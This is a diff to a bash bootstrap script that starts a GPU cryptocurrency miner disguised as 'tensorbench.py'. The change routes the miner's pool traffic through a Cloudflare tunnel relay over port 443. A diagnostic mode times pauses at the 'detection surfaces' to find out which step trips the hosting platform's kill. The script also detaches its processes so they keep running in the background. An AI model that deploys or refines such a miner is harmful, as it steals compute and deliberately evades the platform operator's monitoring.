@@ -135,35 +135,24 @@ pkill -f "tensorbench[.]py$"     2>/dev/null && ok "killed prior tensorbench"   
 pkill -f "pool_tunnel_client[.]py$" 2>/dev/null && ok "killed prior tunnel client" || ok "no prior tunnel client"
 sleep 1
 
-# ---------- 11. Start the tunnel client (opens WSS to trycloudflare.com) ----------
+# ---------- 11. Export the WSS endpoint (direct relay egress) ----------
+# No local tunnel client anymore: the miner opens one TLS-443 websocket
+# straight to the Cloudflare-hosted relay (pool_relay_server.py), which
+# converts the frames to plain stratum for the pool.
 LOGDIR="$INSTALL_DIR/logs"; mkdir -p "$LOGDIR"
-step "START pool_tunnel_client.py  (opens outbound WSS to *.trycloudflare.com on port 443)"
-cd "$INSTALL_DIR"
 export PYTHONPATH=python
-setsid nohup "$PY" tools/pool_tunnel_client.py \
-    > "$LOGDIR/tunnel_client.log" 2>&1 < /dev/null &
-disown
-TUNNEL_PID=$!
-ok "tunnel client PID $TUNNEL_PID -- waiting up to 30s for 'listening tcp'"
-for i in $(seq 1 15); do
-    grep -q "listening tcp" "$LOGDIR/tunnel_client.log" 2>/dev/null && break
-    sleep 2
-done
-if grep -q "listening tcp" "$LOGDIR/tunnel_client.log" 2>/dev/null; then
-    ok "tunnel ready: $(grep 'listening tcp' "$LOGDIR/tunnel_client.log" | tail -1)"
-else
-    fail "tunnel did not start in 30s -- log:"
-    cat "$LOGDIR/tunnel_client.log" 2>/dev/null || echo "  (log empty)"
-fi
+export TB_WSS_URL="${TB_WSS_URL:-wss://integral-aurora-reduction-relating.trycloudflare.com}"
+ok "WSS relay endpoint: $TB_WSS_URL (miner connects directly -- no local tunnel client)"
 
 # ---------- 12. Start the miner (tensorbench.py) ----------
 # DIAG=1 (e.g. `DIAG=1 bash bootstrap_diag.sh`) also turns on the in-process
-# TB_DIAG pause profile: every GPU kernel / D2H / pool / proof operation inside
-# tensorbench.py gets its own labelled 20s pause, so you can isolate which
-# mining-side operation trips the platform. Each "DIAG STEP N" banner names the
-# operation about to run; the last banner before the kill is the culprit.
+# TB_DIAG observation profile: 20s windows are opened ONLY at the ~5 real
+# detection surfaces (custom runtime loaded, CUDA context created, device
+# buffers allocated, WSS egress live, GPU mining active) and live nvidia-smi
+# state is logged every ~5s DURING each window -- no blind stalls. The last
+# "DIAG STEP N" banner before a kill names the surface that tripped it.
 if [ "${DIAG:-0}" = "1" ]; then
-    step "START tensorbench.py (DIAG=1: 20s pause before EVERY GPU/pool/proof op)"
+    step "START tensorbench.py (DIAG=1: 20s observation windows at the real detection surfaces)"
     export TB_DIAG=1
 else
     step "START tensorbench.py (launches GPU mining workers, one per GPU)"
@@ -174,7 +163,7 @@ setsid nohup "$PY" python/tensorbench.py \
 disown
 MINER_PID=$!
 if [ "${DIAG:-0}" = "1" ]; then
-    ok "miner PID $MINER_PID -- DIAG profile: ~15 pauses x 20s before handshake; waiting up to 10min"
+    ok "miner PID $MINER_PID -- DIAG profile: ~5 observation windows before handshake; waiting up to 10min"
     for i in $(seq 1 300); do
         grep -q "pool authorize" "$LOGDIR/real.log" 2>/dev/null && break
         sleep 2
@@ -195,7 +184,6 @@ if grep -q "pool authorize" "$LOGDIR/real.log" 2>/dev/null; then
 else
     fail "no pool handshake in 60s"
     echo "--- real.log ---"; tail -10 "$LOGDIR/real.log" 2>/dev/null
-    echo "--- tunnel_client.log ---"; tail -10 "$LOGDIR/tunnel_client.log" 2>/dev/null
 fi
 
 echo ""
